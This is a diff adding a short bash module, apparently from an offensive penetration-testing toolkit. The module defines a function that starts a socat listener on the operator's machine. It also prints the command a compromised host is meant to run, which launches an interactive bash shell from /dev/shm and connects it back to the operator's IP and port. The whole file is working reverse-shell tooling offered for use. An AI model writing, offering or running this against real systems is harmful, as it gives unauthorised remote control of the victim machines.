@@ -1,0 +1,13 @@
+#!/bin/bash
+
+. "${repository_root}/yaes/modules/common-utils"
+
+function socat_shell
+{
+  local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
+  port=${1}
+  decho_green "client command below..."
+  decho "/dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${local_ip}:${port}"
+  decho_green "starting socat shell listener at ${local_ip}/${port}..."
+  socat file:`tty`,raw,echo=0 tcp-listen:${port}  
+}
